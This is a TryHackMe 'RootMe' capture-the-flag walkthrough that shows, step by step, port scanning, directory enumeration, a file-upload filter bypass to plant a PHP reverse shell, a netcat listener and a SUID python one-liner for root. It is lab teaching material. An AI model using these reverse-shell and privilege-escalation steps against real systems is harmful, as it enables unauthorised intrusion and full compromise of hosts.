Date : 15-05-2026

# Topic - Rootme walkthrough

RootMe - TryHackMe Walkthrough

Target IP

```bash
export IP=10.10.x.x
```

Nmap Scan

```bash
nmap -sC -sV -A $IP
```

Open Ports Found
- 22 SSH
- 80 HTTP

Web Enumeration

```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
```

Discovered:
- `/uploads`
- `/panel`

File Upload Exploitation

Goal:
- Upload a PHP reverse shell

Rename shell:

```bash
shell.php -> shell.phtml
```

Start listener:

```bash
nc -lvnp 4444
```

Upload reverse shell through `/panel`.

Access uploaded shell:

```text
http://$IP/uploads/shell.phtml
```

Reverse shell received.

Stabilize Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Find User Flag

```bash
find / -name user.txt 2>/dev/null
cat /path/user.txt
```

Privilege Escalation Enumeration

Check SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

Interesting binary found:
- `/usr/bin/python`

Exploit SUID Python

```bash
python -c 'import os; os.execl("/bin/sh","sh","-p")'
```

Root shell obtained.

Read Root Flag

```bash
cat /root/root.txt
```

Key Learning Points
- Web directory enumeration
- File upload bypass
- Reverse shells
- Linux shell stabilization
- SUID privilege escalation

Tools Used
- nmap
- gobuster
- netcat
- python
- find
